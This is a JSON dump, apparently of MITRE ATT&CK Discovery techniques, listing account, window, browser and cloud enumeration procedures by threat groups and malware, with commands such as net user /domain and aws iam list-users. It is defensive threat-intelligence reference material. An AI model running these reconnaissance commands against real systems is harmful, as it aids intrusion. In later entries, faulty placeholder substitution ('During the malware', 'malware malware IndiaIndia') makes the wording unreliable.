                        "Name": "Chimera",
                        "Description": "<name> has used net user for account discovery.[13]"
                    },
                    "S0244": {
                        "ID": "S0244",
                        "Name": "Comnie",
                        "Description": "<name> uses the net user command.[14]"
                    },
                    "S0038": {
                        "ID": "S0038",
                        "Name": "Duqu",
                        "Description": "The discovery modules used with <name> can collect information on accounts and permissions.[15]"
                    },
                    "S0081": {
                        "ID": "S0081",
                        "Name": "Elise",
                        "Description": "<name> executes net user after initial communication is made to the remote server.[16]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can acquire local and domain user account information.[17]"
                    },
                    "S0091": {
                        "ID": "S0091",
                        "Name": "Epic",
                        "Description": "<name> gathers a list of all user accounts, privilege classes, and time of last logon.[18]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has accessed ntuser.dat and UserClass.dat on compromised hosts.[19]"
                    },
                    "S0049": {
                        "ID": "S0049",
                        "Name": "GeminiDuke",
                        "Description": "<name> collects information on local user accounts from the victim.[20]"
                    },
                    "S0537": {
                        "ID": "S0537",
                        "Name": "HyperStack",
                        "Description": "<name> can enumerate all account names on a remote share.[21]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> has a command to list account information on the victim\u2019s machine.[22]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> gathers information on local groups and members on the victim\u2019s machine.[23]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> performs account discovery using commands such as net localgroup administrators and net group \"REDACTED\" /domain on specific permissions groups.[24]"
                    },
                    "S0236": {
                        "ID": "S0236",
                        "Name": "Kwampirs",
                        "Description": "<name> collects a list of accounts with the command net users.[25]"
                    },
                    "S1015": {
                        "ID": "S1015",
                        "Name": "Milan",
                        "Description": "<name> has run C:\\Windows\\system32\\cmd.exe /c cmd /c dir c:\\users\\ /s 2>&1 to discover local accounts.[26]"
                    },
                    "S0084": {
                        "ID": "S0084",
                        "Name": "Mis-Type",
                        "Description": "<name> may create a file containing the results of the command cmd.exe /c net user {Username}.[27]"
                    },
                    "G1009": {
                        "ID": "G1009",
                        "Name": "Moses Staff",
                        "Description": "<name> has collected the administrator username from a compromised host.[28]"
                    },
                    "S0233": {
                        "ID": "S0233",
                        "Name": "MURKYTOP",
                        "Description": "<name> has the capability to retrieve information about users on remote hosts.[29]"
                    },
                    "S0039": {
                        "ID": "S0039",
                        "Name": "Net",
                        "Description": "Commands under net user can be used in <name> to gather information about and manipulate user accounts.[30]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has run net user, net user /domain, net group \"domain admins\" /domain, and net group \"Exchange Trusted Subsystem\" /domain to get account listings on a victim.[31]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors used the net user command to gather account information.[32]"
                    },
                    "S0165": {
                        "ID": "S0165",
                        "Name": "OSInfo",
                        "Description": "<name> enumerates local and domain users[6]"
                    },
                    "S0598": {
                        "ID": "S0598",
                        "Name": "P.A.S. Webshell",
                        "Description": "<name> can display the /etc/passwd file on a compromised host.[33]"
                    },
                    "S0453": {
                        "ID": "S0453",
                        "Name": "Pony",
                        "Description": "<name> has used the NetUserEnum function to enumerate local accounts.[34]"
                    },
                    "G0033": {
                        "ID": "G0033",
                        "Name": "Poseidon Group",
                        "Description": "<name> searches for administrator accounts on both the local victim machine and the network.[35]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> can enumerate local and domain user account information.[36]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name>'s Get-ProcessTokenGroup Privesc-PowerUp module can enumerate all SIDs associated with its current token.[37][38]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> can retrieve usernames from compromised hosts.[39]"
                    },
                    "S0196": {
                        "ID": "S0196",
                        "Name": "PUNCHBUGGY",
                        "Description": "<name> can gather user names.[40]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> uses PowerView and Pywerview to perform discovery commands such as net user, net group, net local group, etc.[41]"
                    },
                    "S0241": {
                        "ID": "S0241",
                        "Name": "RATANKBA",
                        "Description": "<name> uses the net user command.[42]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "<name> can obtain a list of users.[43]"
                    },
                    "S0085": {
                        "ID": "S0085",
                        "Name": "S-Type",
                        "Description": "<name> has run the command net user on a victim.[27]"
                    },
                    "S0063": {
                        "ID": "S0063",
                        "Name": "SHOTPUT",
                        "Description": "<name> has a command to retrieve information about connected users.[44]"
                    },
                    "S0649": {
                        "ID": "S0649",
                        "Name": "SMOKEDHAM",
                        "Description": "<name> has used net.exe user and net.exe users to enumerate local accounts on a compromised host.[45]"
                    },
                    "S0516": {
                        "ID": "S0516",
                        "Name": "SoreFang",
                        "Description": "<name> can collect usernames from the local system via net.exe user.[46]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> enumerates user accounts of the local host.[47]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has used net user to conduct internal discovery of systems.[48]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> collects the users of the system.[49][50]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used net user to enumerate local accounts on the system.[51][52]"
                    },
                    "S0452": {
                        "ID": "S0452",
                        "Name": "USBferry",
                        "Description": "<name> can use net user to gather information about local accounts.[53]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> has the ability to enumerate local admin accounts.[54]"
                    }
                }
            },
            "002": {
                "name": "Domain Account",
                "href": "/techniques/T1087/002",
                "description": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.Commands such as net user /domain and net group /domain of the Net utility, dscacheutil -q groupon macOS, and ldapsearch on Linux can list domain users and groups. PowerShell cmdlets including Get-ADUser and Get-ADGroupMember may enumerate members of Active Directory groups.[1]",
                "Procedure": {
                    "S0552": {
                        "ID": "S0552",
                        "Name": "AdFind",
                        "Description": "<name> can enumerate domain users.[2][3][4][5][6]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used built-in net commands to enumerate domain administrator users.[7]"
                    },
                    "S0239": {
                        "ID": "S0239",
                        "Name": "Bankshot",
                        "Description": "<name> gathers domain and account names/information through process monitoring.[8]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> has the ability to identify domain administrator accounts.[9][10]"
                    },
                    "S1068": {
                        "ID": "S1068",
                        "Name": "BlackCat",
                        "Description": "<name> can utilize net use commands to identify domain users.[11]"
                    },
                    "S0521": {
                        "ID": "S0521",
                        "Name": "BloodHound",
                        "Description": "<name> can collect information about domain users, including identification of domain admin accounts.[12]"
                    },
                    "S0635": {
                        "ID": "S0635",
                        "Name": "BoomBox",
                        "Description": "<name> has the ability to execute an LDAP query to enumerate the distinguished name, SAM account name, and display name for all domain users.[13]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has used net user /domain to identify account information.[14]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> can use LDAP queries, net group \"Domain Admins\" /domain and net user /domain for discovery.[15][16]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has has used net user /dom and net user Administrator to enumerate domain accounts including administrator accounts.[17][18]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can determine if the user on an infected machine is in the admin or domain admin group.[19]"
                    },
                    "S0488": {
                        "ID": "S0488",
                        "Name": "CrackMapExec",
                        "Description": "<name> can enumerate the domain user accounts on a targeted system.[20]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has used batch scripts to enumerate users on a victim domain controller.[21]"
                    },
                    "S0105": {
                        "ID": "S0105",
                        "Name": "dsquery",
                        "Description": "<name> can be used to gather information on user accounts within a domain.[22][23]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can acquire local and domain user account information.[24][25]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> can identify user accounts associated with a Service Principal Name and query Service Principal Names within the domain by utilizing the following scripts: GetUserSPNs.vbs and querySpn.vbs.[26][27]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has used Metasploit\u2019s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database.[28]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has used the Softerra LDAP browser to browse documentation on service accounts.[29]"
                    },
                    "S1022": {
                        "ID": "S1022",
                        "Name": "IceApple",
                        "Description": "The <name> Active Directory Querier module  can perform authenticated requests against an Active Directory server.[30]"
                    },
                    "S0483": {
                        "ID": "S0483",
                        "Name": "IcedID",
                        "Description": "<name> can query LDAP to identify additional users on the network to infect.[31]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> performs account discovery using commands such as net localgroup administrators and net group \"REDACTED\" /domain on specific permissions groups.[32]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has used the AD Explorer tool to enumerate users on a victim's network.[33][34]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used the Microsoft administration tool csvde.exe to export Active Directory data.[35]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used cmd.exe net user /domain to enumerate domain users.[36]"
                    },
                    "S0039": {
                        "ID": "S0039",
                        "Name": "Net",
                        "Description": "<name> commands used with the /domain flag can be used to gather information about and manipulate user accounts on the current domain.[37]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has run net user, net user /domain, net group \"domain admins\" /domain, and net group \"Exchange Trusted Subsystem\" /domain to get account listings on a victim.[38]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors used the dsquery and dsget commands to get domain environment information and to query users in administrative groups.[39]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group queried compromised victim's active directory servers to obtain the list of employees including administrator accounts.[40]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used the net command to retrieve information about domain accounts.[41]"
                    },
                    "S0165": {
                        "ID": "S0165",
                        "Name": "OSInfo",
                        "Description": "<name> enumerates local and domain users[42]"
                    },
                    "G0033": {
                        "ID": "G0033",
                        "Name": "Poseidon Group",
                        "Description": "<name> searches for administrator accounts on both the local victim machine and the network.[43]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> can enumerate local and domain user account information.[44]"
                    },
                    "S0184": {
                        "ID": "S0184",
                        "Name": "POWRUNER",
                        "Description": "<name> may collect user account information by running net user /domain or a series of other commands on a victim.[45]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has used a tool to query Active Directory using LDAP, discovering information about usernames listed in AD.[46]"
                    },
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "<name> leverages legitimate domain accounts to gain access to the target environment.[47][48]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can use System.Security.AccessControl namespaces to retrieve domain user information.[49]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used PowerShell to discover domain accounts by exectuing Get-ADUser and Get-ADGroupMember.[1][50]"
                    },
                    "S0516": {
                        "ID": "S0516",
                        "Name": "SoreFang",
                        "Description": "<name> can enumerate domain accounts via net.exe user /domain.[51]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> enumerates user accounts of the domain.[52]"
                    },
                    "S0018": {
                        "ID": "S0018",
                        "Name": "Sykipot",
                        "Description": "<name> may use net group \"domain admins\" /domain to display accounts in the \"domain admins\" permissions group and net localgroup \"administrators\" to list local system administrator group membership.[53]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> has run net user %USER% /dom for account discovery.[54]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used net user /domain to enumerate domain accounts.[55]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> has the ability to enumerate domain admin accounts.[56]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has run net group /dom and net group \"Domain Admins\" /dom in compromised environments for account discovery.[57][58]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has identified domain admins through the use of net group \"Domain admins\" /DOMAIN. <name> has also leveraged the PowerShell cmdlet Get-ADComputer to collect account names from Active Directory data.[10][59]"
                    }
                }
            },
            "003": {
                "name": "Email Account",
                "href": "/techniques/T1087/003",
                "description": "Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).[1]In on-premises Exchange and Exchange Online, theGet-GlobalAddressList PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.[2][3]In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.[4]",
                "Procedure": {
                    "S0093": {
                        "ID": "S0093",
                        "Name": "Backdoor.Oldrea",
                        "Description": "<name> collects address book information from Outlook.[5]"
                    },
                    "S0635": {
                        "ID": "S0635",
                        "Name": "BoomBox",
                        "Description": "<name> can execute an LDAP query to discover e-mail accounts for domain users.[6]"
                    },
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider accessed Azure AD to identify email addresses.[7]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has been observed leveraging a module that can scrape email addresses from Outlook.[8][9][10]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can parse Outlook .pst files to extract e-mail addresses.[11]"
                    },
                    "S0681": {
                        "ID": "S0681",
                        "Name": "Lizar",
                        "Description": "<name> can collect email accounts from Microsoft Outlook and Mozilla Thunderbird.[12]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used Powershell to discover email accounts.[13]"
                    },
                    "S0413": {
                        "ID": "S0413",
                        "Name": "MailSniper",
                        "Description": "<name> can be used to obtain account names from Exchange and Office 365 using the Get-GlobalAddressList cmdlet.[3]"
                    },
                    "S0358": {
                        "ID": "S0358",
                        "Name": "Ruler",
                        "Description": "<name> can be used to enumerate Exchange users and dump the GAL.[14]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> used malware to enumerate email settings, including usernames and passwords, from the M.E.Doc application.[15]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used the tool EmailStealer to steal and send lists of e-mail addresses to a remote server.[16]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> collects email addresses from Outlook.[17]"
                    }
                }
            },
            "004": {
                "name": "Cloud Account",
                "href": "/techniques/T1087/004",
                "description": "Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.With authenticated access there are several tools that can be used to find accounts. The Get-MsolRoleMember PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.[1][2] The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command az ad user list will list all users within a domain.[3][4] The AWS command aws iam list-users may be used to obtain a list of users in the current account while aws iam list-roles can obtain IAM roles that have a specified path prefix.[5][6] In GCP, gcloud iam service-accounts list and gcloud projects get-iam-policy may be used to obtain a listing of service accounts and users in a project.[7]",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can enumerate Azure AD users.[8]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has conducted enumeration of Azure AD accounts.[9]"
                    },
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider accessed Azure AD to download bulk lists of group members and to identify privileged users, along with the email addresses and AD attributes.[10]"
                    },
                    "S1091": {
                        "ID": "S1091",
                        "Name": "Pacu",
                        "Description": "<name> can enumerate IAM users, roles, and groups. [11]"
                    },
                    "S0684": {
                        "ID": "S0684",
                        "Name": "ROADTools",
                        "Description": "<name> can enumerate Azure AD users.[12]"
                    }
                }
            }
        },
        "tactic": "Discovery",
        "description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.For examples, cloud environments typically provide easily accessible interfaces to obtain user lists.[1][2] On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system\u2019s files.",
        "Procedure": {
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has enumerated all users and their roles from a victim's main treasury system.[3]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware listed all non-privileged and privileged accounts available on the machine.[4]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 obtained a list of users and their roles from an Exchange server using Get-ManagementRoleAssignment.[5]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware can identify administrator accounts on an infected machine.[6]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware attempts to discover accounts from various locations such as a user's Evernote, AppleID, Telegram, Skype, and WeChat data.[7]"
            }
        }
    },
    "T1010": {
        "ttp_name": "Application Window Discovery",
        "ttp_id": "T1010",
        "href": "/techniques/T1010",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.[1] For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.[2]Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
        "Procedure": {
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has the ability to identify the titles of running windows on a compromised host.[3]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware can obtain application window titles and then determines which windows to perform Screen Capture on.[4]"
            },
            "S0454": {
                "ID": "S0454",
                "Name": "Cadelspy",
                "Description": "malware has the ability to identify open windows on the compromised host.[5]"
            },
            "S0261": {
                "ID": "S0261",
                "Name": "Catchamas",
                "Description": "malware obtains application windows titles and then determines which windows to perform Screen Capture on.[6]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware will search for cryptocurrency wallets by examining application window names for specific strings.[7] malware extracts information collected via NirSoft tools from the hosting process's memory by first identifying the window through the FindWindow API function.[7]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware reports window names along with keylogger information to provide application context.[1]"
            },
            "S0038": {
                "ID": "S0038",
                "Name": "Duqu",
                "Description": "The discovery modules used with malware can collect information on open windows.[8]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware can check the name of the window displayed on the system.[9]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware has the ability to discover application windows via execution of EnumWindows.[10]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can identify installed security tools based on window names.[2]"
            },
            "G1001": {
                "ID": "G1001",
                "Name": "HEXANE",
                "Description": "malware has used a PowerShell-based keylogging tool to capture the window title.[11]"
            },
            "S0431": {
                "ID": "S0431",
                "Name": "HotCroissant",
                "Description": "malware has the ability to list the names of all open windows on the infected host.[12]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can enumerate windows and child windows on a compromised host.[13][14]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware gathers information about opened windows.[15]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground.[16][17][18]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware saves the window names.[19]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware can enumerate all windows on the victim\u2019s machine.[20][21]"
            },
            "S0033": {
                "ID": "S0033",
                "Name": "NetTraveler",
                "Description": "malware reports window names along with keylogger information to provide application context.[22]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can discover and close windows on controlled systems.[23]"
            },
            "S1090": {
                "ID": "S1090",
                "Name": "NightClub",
                "Description": "malware can use GetForegroundWindow to enumerate the active window.[24]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware gathers information about opened windows during the initial infection.[25]"
            },
            "S0435": {
                "ID": "S0435",
                "Name": "PLEAD",
                "Description": "malware has the ability to list open windows on the compromised host.[26][26]"
            },
            "S0012": {
                "ID": "S0012",
                "Name": "PoisonIvy",
                "Description": "malware captures window titles.[27]"
            },
            "S0139": {
                "ID": "S0139",
                "Name": "PowerDuke",
                "Description": "malware has a command to get text of the current foreground window.[28]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware has the ability to enumerate windows on a compromised host.[29]"
            },
            "S0375": {
                "ID": "S0375",
                "Name": "Remexi",
                "Description": "malware has a command to capture active windows on the machine and retrieve window titles.[30]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can use  the GetForegroundWindow and GetWindowText APIs to discover where the user is typing.[31]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can enumerate the active Window during keylogging through execution of GetActiveWindowTitle.[32]"
            },
            "S0157": {
                "ID": "S0157",
                "Name": "SOUNDBITE",
                "Description": "malware is capable of enumerating application windows.[33]"
            },
            "S0094": {
                "ID": "S0094",
                "Name": "Trojan.Karagany",
                "Description": "malware can monitor the titles of open windows to identify specific keywords.[34]"
            },
            "S0219": {
                "ID": "S0219",
                "Name": "WINERACK",
                "Description": "malware can enumerate active windows.[35]"
            }
        }
    },
    "T1217": {
        "ttp_name": "Browser Information Discovery",
        "ttp_id": "T1217",
        "href": "/techniques/T1217",
        "tactic": "Discovery",
        "description": "Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.[1]Browser information may also highlight additional targets after an adversary has access to valid credentials, especially Credentials In Files associated with logins cached by a browser.Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., %APPDATA%/Google/Chrome).[2]",
        "Procedure": {
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.[3]"
            },
            "S0274": {
                "ID": "S0274",
                "Name": "Calisto",
                "Description": "malware collects information on bookmarks from Google Chrome.[4]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used type \\\\c$\\Users\\\\Favorites\\Links\\Bookmarks bar\\Imported From IE*citrix* for bookmark discovery.[5]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware can retrieve browser history.[6]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware can retrieve browser history.[7][8]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware has the ability to gather browser data such as bookmarks and visited sites.[9]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has used Google Chrome bookmarks to identify internal resources and assets.[10]"
            },
            "S0681": {
                "ID": "S0681",
                "Name": "Lizar",
                "Description": "malware can retrieve browser history and database files.[11][12]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware retrieves the user profile data (e.g., browsers) from Chrome and Firefox browsers.[13]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can collect the contents of the %USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\LocalState file.[14]"
            },
            "S1122": {
                "ID": "S1122",
                "Name": "Mispadu",
                "Description": "malware can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.[15][16]"
            },
            "S0079": {
                "ID": "S0079",
                "Name": "MobileOrder",
                "Description": "malware has a command to upload to its C2 server victim browser bookmarks.[17]"
            },
            "S1012": {
                "ID": "S1012",
                "Name": "PowerLess",
                "Description": "malware has a browser info stealer module that can read Chrome and Edge browser database files.[18]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware retrieves browser histories via infostealer malware such as Raccoon Stealer.[19]"
            },
            "S1042": {
                "ID": "S1042",
                "Name": "SUGARDUMP",
                "Description": "malware has collected browser bookmark and history information.[20]"
            }
        }
    },
    "T1580": {
        "ttp_name": "Cloud Infrastructure Discovery",
        "ttp_id": "T1580",
        "href": "/techniques/T1580",
        "tactic": "Discovery",
        "description": "An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a DescribeInstances API within the Amazon EC2 API that can return information about one or more instances within an account, the ListBuckets API that returns a list of all buckets owned by the authenticated sender of the request, the HeadBucket API to determine a bucket\u2019s existence along with access permissions of the request sender, or the GetPublicAccessBlock API to retrieve access block configuration for a bucket.[1][2][3][4] Similarly, GCP's Cloud SDK CLI provides the gcloud compute instances list command to list all Google Compute Engine instances in a project [5], and Azure's CLI command az vm list lists details of virtual machines.[6] In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through Wordlist Scanning.[7]An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.[8] The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.[9]An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as DescribeDBInstances to determine size, owner, permissions, and network ACLs of database resources. [10] Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in Cloud Service Discovery, this technique focuses on the discovery of components of the provided services rather than the services themselves.",
        "Procedure": {
            "S1091": {
                "ID": "S1091",
                "Name": "Pacu",
                "Description": "malware can enumerate AWS infrastructure, such as EC2 instances.[11]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware enumerates cloud environments to identify server and backup management infrastructure, resource access, databases and storage containers.[12]"
            }
        }
    },
    "T1538": {
        "ttp_name": "Cloud Service Dashboard",
        "ttp_id": "T1538",
        "href": "/techniques/T1538",
        "tactic": "Discovery",
        "description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.[1]Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",
        "Procedure": {
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware abused AWS Systems Manager Inventory to identify targets on the compromised network prior to lateral movement.[2]"
            }
        }
    },
    "T1526": {
        "ttp_name": "Cloud Service Discovery",
        "ttp_id": "T1526",
        "href": "/techniques/T1526",
        "tactic": "Discovery",
